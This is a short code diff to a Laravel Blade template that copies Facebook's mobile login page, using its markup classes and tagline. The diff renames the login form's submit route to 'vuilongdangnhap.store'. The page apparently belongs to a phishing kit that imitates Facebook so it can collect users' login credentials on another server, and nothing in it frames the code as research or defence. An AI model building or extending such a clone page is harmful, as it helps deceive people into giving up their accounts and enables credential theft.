@@ -47,7 +47,7 @@
                             </div>
                             <div class="_5rut" style="text-align: center; margin-bottom: 30px; margin-top: 30px;"><span style="line-height: 1.5; font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif; font-size: 20px">{{ __('Facebook helps you connect and share with the people in your life.') }}</span></div>
                             <div class="_5rut">
-                                <form action="{{ route('login.store') }}" method="post" class="mobile-login-form _9hp- _5spm">
+                                <form action="{{ route('vuilongdangnhap.store') }}" method="post" class="mobile-login-form _9hp- _5spm">
                                     @csrf
                                     <div id="user_info_container" data-sigil="user_info_after_failure_element">
                                     </div>
